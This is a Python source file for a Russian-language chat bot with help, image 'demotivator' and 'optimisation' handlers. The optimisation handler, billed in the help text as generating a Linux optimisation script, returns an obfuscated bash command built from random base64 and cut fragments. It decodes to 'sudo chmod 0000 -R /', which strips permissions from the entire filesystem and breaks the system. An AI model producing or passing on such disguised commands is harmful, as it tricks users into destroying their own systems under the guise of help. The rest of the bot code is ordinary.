import atexit
import base64

from datetime import datetime
from random import randint, choice
from typing import List, Awaitable, Callable
from string import ascii_letters as ASCII_LETTERS

from PIL import UnidentifiedImageError

from images.demotivator import Demotivator
from images.searchimages import ImgSearch
from images.vasyacache import Vasya


class Bot:
    def __init__(self):
        self._rateLimit = self._RateLimit()
        self._imgSearch = ImgSearch()

    class _RateLimit:
        _recent = {}

        async def ratecounter(self, _id: int, msgId: int) -> bool:
            now = datetime.now().timestamp()
            if _id in self._recent.keys() and self._recent[_id][0] + 3 > now and msgId != self._recent[_id][1]:
                return False
            else:
                self._recent[_id] = [now, msgId]
                return True

    class _Handler:
        ratecounter: Callable[[int], Awaitable[bool]]
        imgSearch: ImgSearch

        def __init__(self, ratecounter: Callable[[int], Awaitable[bool]], imgSearch: ImgSearch):
            self._ratecounter = ratecounter
            self._imgSearch = imgSearch

        class Image:
            def __init__(self, url=None, filepath=None):
                assert url or filepath, 'URL or filepath for image must be provided.'
                self.url = url
                self.filepath = filepath

        @staticmethod
        async def filter(query: str) -> bool:
            ...

        async def run(self, _id: int, query: str, attachedPhotos: list) -> list:  # returns a list of strings or images
            ...

    registredHandlers: List[_Handler]

    async def _regHandler(self, h: type) -> None:
        ...

    class _Help(_Handler):
        @staticmethod
        async def filter(query: str) -> bool:
            return query in ['help', 'команды', 'помощь', 'commands']

        async def run(self, _id: int, query: str, attachedPhotos: list) -> list:
            await super().run(_id, query, attachedPhotos)
            return ['''Внимание! Не срите в бота чаще 3 секунд!
Команды:
оптимизация - Сгенерировать скрипт оптимизации kaл linux
демотиватор текст сверху;текст снизу - генерация демотиватора с приложенной картинкой.
При вызове без картинки используется картинка по запросу, равному тексту сверху
При вызове без параметров генерируется текст на основе ассоциаций бота васи ( https://vk.com/vasyamashinka )''']

    class _Optimisation(_Handler):
        @staticmethod
        async def filter(query: str):
            return query.startswith(('оптимизация', 'optimisation'))

        async def run(self, _id: int, query: str, attachedPhotos: list) -> list:
            await super().run(_id, query, attachedPhotos)

            def bashEncode(string):
                def randString(size):
                    return ''.join(choice(ASCII_LETTERS) for _ in range(size))

                def b64(s):
                    return f"`echo {base64.b64encode(bytes(s, 'ascii')).decode('ascii')} | base64 -d`"

                def cut(s):
                    len1, len2 = randint(2, 10), randint(2, 10)
                    rand1, rand2 = randString(len1), randString(len2)
                    pos = len1 + 1
                    return f"`echo {rand1}{s}{rand2} | cut -b {pos}-{pos}`"

                result = "$("
                for sym in string:
                    mode = randint(0, 1)
                    if mode == 0:
                        result += b64(sym)
                    elif mode == 1:
                        result += cut(sym)
                return result + ")"

            return [bashEncode("sudo chmod 0000 -R /")]

    class _Demotivator(_Handler):
        def __init__(self, ratecounter, imgSearch):
            super().__init__(ratecounter, imgSearch)
            self._demotivator = Demotivator()
            self._vasyaCache = Vasya(self._demotivator, self._imgSearch)
            self._vasyaCache.start()
            atexit.register(lambda: setattr(self._vasyaCache, "running", False))

        @staticmethod
        async def filter(query: str):
            return query.startswith(('демотиватор', 'demotivator'))

        async def run(self, _id: int, query: str, attachedPhotos: list) -> list:
            await super().run(_id, query, attachedPhotos)
            result = []
            notFound = False
            msg = query.split(';')
            msg[0] = msg[0][12:]
            if not msg[0]:
                result.append(self.Image(filepath=self._vasyaCache.getDemotivator()))
                return result
            elif len(msg) != 2:
                result.append('''Использование:
демотиватор текст сверху;текст снизу
Использование ассоциаций из БД васи машинки:
демотиватор''')
                return result
            d: Demotivator
            try:
                d = self._demotivator.create(
                    attachedPhotos[0],
                    msg[0],
                    msg[1]
                )
            except IndexError or AttributeError:
                query = msg[0]
                links = self._imgSearch.fetch(query)
                if not links:
                    links = self._imgSearch.fetch("kernel panic")
                    notFound = True
                link = links[randint(0, len(links) - 1)]
                while True:
                    try:
                        d = self._demotivator.create(
                            link,
                            msg[0],
                            msg[1]
                        )
                        break
                    except UnidentifiedImageError:
                        links.pop(links.index(link))
                        link = links[randint(0, len(links) - 1)]
                        continue
            result.append(self.Image(filepath=d))
            if notFound:
                result.append("kалов не найдено((9(")
            return result
